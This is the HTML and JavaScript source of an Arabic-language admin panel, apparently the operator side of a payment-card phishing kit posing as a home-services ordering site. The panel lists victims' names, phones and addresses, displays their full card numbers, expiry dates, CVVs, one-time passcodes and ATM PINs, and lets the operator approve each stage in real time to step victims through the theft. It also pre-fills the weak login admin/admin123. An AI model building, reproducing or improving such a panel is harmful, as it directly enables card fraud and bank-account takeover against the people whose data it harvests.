<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>لوحة التحكم — معاون</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f8fafc; color: #1e293b; min-height: 100vh; direction: rtl; }

    /* Login Screen */
    #loginScreen {
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; background: linear-gradient(135deg, #f0f4ff 0%, #e8f0fe 100%);
    }
    .login-box {
      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px;
      padding: 40px; width: 380px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.1);
    }
    .login-box .logo { font-size: 28px; font-weight: 700; color: #c8a96e; margin-bottom: 8px; }
    .login-box .subtitle { color: #64748b; font-size: 14px; margin-bottom: 32px; }
    .form-group { margin-bottom: 16px; text-align: right; }
    .form-group label { display: block; font-size: 13px; color: #475569; margin-bottom: 6px; }
    .form-group input {
      width: 100%; padding: 12px 16px; background: #f8fafc; border: 1px solid #cbd5e1;
      border-radius: 8px; color: #1e293b; font-size: 14px; outline: none;
    }
    .form-group input:focus { border-color: #c8a96e; }
    .btn-login {
      width: 100%; padding: 14px; background: linear-gradient(135deg, #c8a96e, #a0845a);
      border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600;
      cursor: pointer; margin-top: 8px; transition: opacity 0.2s;
    }
    .btn-login:hover { opacity: 0.9; }
    .error-msg { color: #f87171; font-size: 13px; margin-top: 8px; }

    /* Dashboard */
    #dashboard { display: none; }
    .header {
      background: #ffffff; border-bottom: 1px solid #e2e8f0;
      padding: 16px 24px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 4px rgba(0,0,0,0.06);
    }
    .header .brand { font-size: 20px; font-weight: 700; color: #c8a96e; }
    .header .admin-info { display: flex; align-items: center; gap: 12px; }
    .header .admin-name { font-size: 14px; color: #64748b; }
    .btn-logout {
      padding: 8px 16px; background: transparent; border: 1px solid #cbd5e1;
      border-radius: 8px; color: #64748b; cursor: pointer; font-size: 13px; transition: all 0.2s;
    }
    .btn-logout:hover { border-color: #f87171; color: #f87171; }

    .stats-bar {
      display: flex; gap: 16px; padding: 20px 24px; background: #f1f5f9;
      border-bottom: 1px solid #e2e8f0; flex-wrap: wrap;
    }
    .stat-card {
      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px;
      padding: 16px 20px; flex: 1; min-width: 120px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    }
    .stat-card .stat-num { font-size: 28px; font-weight: 700; color: #c8a96e; }
    .stat-card .stat-label { font-size: 12px; color: #64748b; margin-top: 4px; }

    .main-content { padding: 24px; }
    .section-title {
      font-size: 18px; font-weight: 600; color: #1e293b; margin-bottom: 16px;
      display: flex; align-items: center; gap: 8px;
    }
    .live-dot {
      width: 8px; height: 8px; background: #22c55e; border-radius: 50%;
      animation: pulse 2s infinite;
    }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }

    .orders-table { width: 100%; border-collapse: collapse; }
    .orders-table th {
      background: #f8fafc; padding: 12px 16px; text-align: right;
      font-size: 13px; color: #64748b; font-weight: 500; border-bottom: 1px solid #e2e8f0;
    }
    .orders-table td {
      padding: 14px 16px; border-bottom: 1px solid #f1f5f9;
      font-size: 14px; vertical-align: middle;
    }
    .orders-table tr:hover td { background: #f8fafc; }

    .badge {
      display: inline-flex; align-items: center; gap: 4px;
      padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 500;
    }
    .badge.pending { background: #fef3c7; color: #92400e; }
    .badge.waiting { background: #dbeafe; color: #1e40af; }
    .badge.waiting-otp { background: #fce7f3; color: #9d174d; }
    .badge.waiting-atm { background: #ede9fe; color: #4c1d95; }
    .badge.approved { background: #d1fae5; color: #065f46; }
    .badge.rejected { background: #fee2e2; color: #991b1b; }
    .badge.completed { background: #d1fae5; color: #065f46; }

    .action-btns { display: flex; gap: 6px; }
    .btn-view {
      padding: 7px 12px; background: #3b82f6; border: none; border-radius: 6px;
      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s;
    }
    .btn-view:hover { background: #2563eb; }
    .btn-approve {
      padding: 7px 12px; background: #22c55e; border: none; border-radius: 6px;
      color: #fff; font-size: 12px; cursor: pointer;
    }
    .btn-reject {
      padding: 7px 12px; background: #ef4444; border: none; border-radius: 6px;
      color: #fff; font-size: 12px; cursor: pointer;
    }

    /* Modal */
    .modal-overlay {
      display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
      z-index: 100; align-items: center; justify-content: center;
    }
    .modal-overlay.open { display: flex; }
    .modal {
      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px;
      padding: 28px; width: 600px; max-width: 95vw; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
    }
    .modal-title { font-size: 18px; font-weight: 600; color: #c8a96e; margin-bottom: 20px; }
    
    .customer-box {
      background: #f0fdf4; border: 2px solid #22c55e; border-radius: 12px;
      padding: 16px; margin-bottom: 16px;
    }
    .customer-box .box-title { font-size: 14px; font-weight: 700; color: #15803d; margin-bottom: 12px; }
    .customer-box .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #dcfce7; }
    .customer-box .info-row:last-child { border-bottom: none; }
    .customer-box .label { font-size: 12px; color: #4b5563; font-weight: 500; }
    .customer-box .value { font-size: 13px; color: #1e293b; font-weight: 600; }

    .card-box {
      background: #fffbeb; border: 2px solid #f59e0b; border-radius: 12px;
      padding: 16px; margin-bottom: 16px;
    }
    .card-box .box-title { font-size: 14px; font-weight: 700; color: #92400e; margin-bottom: 12px; }
    .card-box .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #fef3c7; }
    .card-box .label { font-size: 12px; color: #78350f; font-weight: 500; }
    .card-box .value { font-size: 13px; color: #1e293b; font-weight: 600; }

    .otp-box {
      background: #fdf4ff; border: 2px solid #a855f7; border-radius: 12px;
      padding: 16px; margin-bottom: 16px; text-align: center;
    }
    .otp-box .box-title { font-size: 14px; font-weight: 700; color: #6b21a8; margin-bottom: 12px; }
    .otp-box .big-code { font-size: 48px; font-weight: 900; color: #7c3aed; letter-spacing: 8px; }

    .atm-box {
      background: #fff7ed; border: 2px solid #f97316; border-radius: 12px;
      padding: 16px; margin-bottom: 16px; text-align: center;
    }
    .atm-box .box-title { font-size: 14px; font-weight: 700; color: #9a3412; margin-bottom: 12px; }
    .atm-box .big-code { font-size: 48px; font-weight: 900; color: #ea580c; letter-spacing: 8px; }

    .modal-actions { display: flex; gap: 10px; margin-top: 20px; justify-content: flex-end; }
    .btn-close {
      padding: 10px 20px; background: transparent; border: 1px solid #cbd5e1;
      border-radius: 8px; color: #64748b; cursor: pointer; font-size: 14px;
    }

    .toast {
      position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px;
      padding: 12px 24px; font-size: 14px; z-index: 200; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      opacity: 0; transition: opacity 0.3s; pointer-events: none;
    }
    .toast.show { opacity: 1; }
    .toast.success { border-color: #22c55e; color: #22c55e; }
    .toast.error { border-color: #ef4444; color: #ef4444; }

    .new-badge {
      background: #c8a96e; color: #ffffff; font-size: 10px; font-weight: 700;
      padding: 2px 6px; border-radius: 10px; animation: blink 1s infinite;
    }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }

    .empty-state { text-align: center; padding: 60px 20px; color: #94a3b8; }
  </style>
</head>
<body>

<div id="loginScreen">
  <div class="login-box">
    <div class="logo">معاون</div>
    <div class="subtitle">لوحة تحكم الإدارة</div>
    <div class="form-group">
      <label>اسم المستخدم</label>
      <input type="text" id="username" value="admin" />
    </div>
    <div class="form-group">
      <label>كلمة المرور</label>
      <input type="password" id="password" value="admin123" />
    </div>
    <button class="btn-login" onclick="login()">دخول</button>
    <div class="error-msg" id="loginError"></div>
  </div>
</div>

<div id="dashboard">
  <div class="header">
    <div class="brand">🏠 معاون — لوحة التحكم</div>
    <div class="admin-info">
      <span class="admin-name" id="adminName"></span>
      <button class="btn-logout" onclick="logout()">خروج</button>
    </div>
  </div>

  <div class="stats-bar">
    <div class="stat-card">
      <div class="stat-num" id="statTotal">0</div>
      <div class="stat-label">إجمالي الطلبات</div>
    </div>
    <div class="stat-card">
      <div class="stat-num" id="statWaiting">0</div>
      <div class="stat-label">بانتظار البطاقة</div>
    </div>
    <div class="stat-card">
      <div class="stat-num" id="statOtp">0</div>
      <div class="stat-label">بانتظار OTP</div>
    </div>
    <div class="stat-card">
      <div class="stat-num" id="statAtm">0</div>
      <div class="stat-label">بانتظار ATM PIN</div>
    </div>
  </div>

  <div class="main-content">
    <div class="section-title">
      <div class="live-dot"></div>
      الطلبات الواردة (الأحدث أولاً)
      <button onclick="loadOrders()" style="margin-right:auto;padding:6px 14px;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:6px;cursor:pointer;font-size:12px;">🔄 تحديث</button>
    </div>

    <div id="ordersContainer">
      <div class="empty-state">جاري تحميل الطلبات...</div>
    </div>
  </div>
</div>

<div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
  <div class="modal" id="modalContent">
    <div class="modal-title">تفاصيل الطلب</div>
    <div id="modalBody"></div>
    <div class="modal-actions" id="modalActions"></div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
let token = localStorage.getItem('adminToken');
let adminUsername = localStorage.getItem('adminUsername');
let orders = [];

if (token) showDashboard();

async function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  try {
    const res = await fetch('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
    if (!res.ok) {
      console.error('Login failed:', data.error);
      alert('خطأ في تسجيل الدخول: ' + (data.error || 'بيانات غير صحيحة'));
      throw new Error(data.error);
    }
    token = data.token;
    adminUsername = data.username;
    localStorage.setItem('adminToken', token);
    localStorage.setItem('adminUsername', adminUsername);
    console.log('Login success, showing dashboard');
    showDashboard();
  } catch (e) {
    console.error('Login exception:', e);
    document.getElementById('loginError').textContent = e.message;
  }
}

function logout() {
  token = null;
  localStorage.removeItem('adminToken');
  document.getElementById('dashboard').style.display = 'none';
  document.getElementById('loginScreen').style.display = 'flex';
}

function showDashboard() {
  document.getElementById('loginScreen').style.display = 'none';
  document.getElementById('dashboard').style.display = 'block';
  document.getElementById('adminName').textContent = adminUsername;
  loadOrders();
  connectWS();
}

function connectWS() {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  const ws = new WebSocket(protocol + '//' + window.location.host + '/ws?admin=1');
  ws.onmessage = (e) => {
    showToast('📩 تحديث جديد وارد!', 'success');
    loadOrders();
  };
  ws.onclose = () => setTimeout(connectWS, 3000);
}

async function loadOrders() {
  try {
    const res = await fetch('/api/admin/orders', {
      headers: { Authorization: 'Bearer ' + token }
    });
    if (res.status === 401) return logout();
    orders = await res.json();
    renderOrders();
    updateStats();
  } catch (e) { console.error(e); }
}

function updateStats() {
  document.getElementById('statTotal').textContent = orders.length;
  document.getElementById('statWaiting').textContent = orders.filter(o => o.status === 'waiting_approval').length;
  document.getElementById('statOtp').textContent = orders.filter(o => o.status === 'waiting_otp').length;
  document.getElementById('statAtm').textContent = orders.filter(o => o.status === 'waiting_atm_pin').length;
}

function renderOrders() {
  const container = document.getElementById('ordersContainer');
  if (!orders.length) {
    container.innerHTML = '<div class="empty-state">لا توجد طلبات بعد</div>';
    return;
  }

  // Force newest first by both ID and created_at
  const sorted = [...orders].sort((a, b) => {
    if (b.id !== a.id) return b.id - a.id;
    return (b.created_at || 0) - (a.created_at || 0);
  });

  const rows = sorted.map(o => {
    const isNew = Date.now() - o.created_at < 60000;
    return `
      <tr>
        <td>${o.order_ref} ${isNew ? '<span class="new-badge">جديد</span>' : ''}</td>
        <td>${o.customer_name || '—'}</td>
        <td>${o.customer_phone || '—'}</td>
        <td>${o.service_type || '—'}</td>
        <td>${o.total_price || '—'} ر.ق</td>
        <td><span class="badge ${o.status}">${o.status}</span></td>
        <td><button class="btn-view" onclick="viewOrder('${o.order_ref}')">عرض</button></td>
      </tr>
    `;
  }).join('');

  container.innerHTML = `
    <table class="orders-table">
      <thead><tr><th>رقم الطلب</th><th>الاسم</th><th>الهاتف</th><th>الخدمة</th><th>المبلغ</th><th>الحالة</th><th>الإجراءات</th></tr></thead>
      <tbody>${rows}</tbody>
    </table>
  `;
}

function viewOrder(ref) {
  const o = orders.find(x => x.order_ref === ref);
  if (!o) return;

  let html = `
    <div class="customer-box">
      <div class="box-title">👤 بيانات العميل</div>
      <div class="info-row"><div class="label">الاسم</div><div class="value">${o.customer_name || '—'}</div></div>
      <div class="info-row"><div class="label">الهاتف</div><div class="value">${o.customer_phone || '—'}</div></div>
      <div class="info-row"><div class="label">العنوان</div><div class="value">${o.customer_address || '—'}</div></div>
      <div class="info-row"><div class="label">الخدمة</div><div class="value">${o.service_type || '—'}</div></div>
      <div class="info-row"><div class="label">المبلغ</div><div class="value">${o.total_price} ر.ق</div></div>
    </div>
  `;

  if (o.card_number) {
    html += `
      <div class="card-box">
        <div class="box-title">💳 بيانات البطاقة</div>
        <div class="info-row"><div class="label">رقم البطاقة</div><div class="value">${o.card_number}</div></div>
        <div class="info-row"><div class="label">التاريخ</div><div class="value">${o.card_expiry}</div></div>
        <div class="info-row"><div class="label">CVV</div><div class="value">${o.card_cvv}</div></div>
      </div>
    `;
  }

  if (o.otp_code) {
    html += `<div class="otp-box"><div class="box-title">🔐 رمز OTP</div><div class="big-code">${o.otp_code}</div></div>`;
  }

  if (o.atm_pin) {
    html += `<div class="atm-box"><div class="box-title">🏧 رقم ATM PIN</div><div class="big-code">${o.atm_pin}</div></div>`;
  }

  document.getElementById('modalBody').innerHTML = html;

  // Show actions only if needed
  let actions = '<button class="btn-close" onclick="closeModal()">إغلاق</button>';
  if (o.status === 'waiting_approval' && o.card_number) {
    actions += `<button class="btn-reject" onclick="action('${ref}', 'reject-card')">❌ رفض</button>`;
    actions += `<button class="btn-approve" onclick="action('${ref}', 'approve-card')">✅ قبول → OTP</button>`;
  } else if (o.status === 'waiting_otp' && o.otp_code) {
    actions += `<button class="btn-reject" onclick="action('${ref}', 'reject-otp')">❌ رفض</button>`;
    actions += `<button class="btn-approve" onclick="action('${ref}', 'approve-otp')">✅ قبول → ATM</button>`;
  } else if (o.status === 'waiting_atm_pin' && o.atm_pin) {
    actions += `<button class="btn-reject" onclick="action('${ref}', 'reject-atm')">❌ رفض</button>`;
    actions += `<button class="btn-approve" onclick="action('${ref}', 'approve-atm')">✅ قبول → نجاح</button>`;
  }

  document.getElementById('modalActions').innerHTML = actions;
  document.getElementById('modalOverlay').classList.add('open');
}

async function action(ref, type) {
  try {
    await fetch(\`/api/admin/orders/\${ref}/\${type}\`, {
      method: 'POST', headers: { Authorization: 'Bearer ' + token }
    });
    showToast('تم تنفيذ الإجراء بنجاح', 'success');
    closeModal();
    loadOrders();
  } catch (e) { showToast('خطأ في التنفيذ', 'error'); }
}

function closeModal(e) {
  if (!e || e.target === document.getElementById('modalOverlay') || e.target.className === 'btn-close') {
    document.getElementById('modalOverlay').classList.remove('open');
  }
}

function showToast(msg, type) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  setTimeout(() => t.className = 'toast', 3000);
}

setInterval(() => { if (token) loadOrders(); }, 10000);
</script>
</body>
</html>
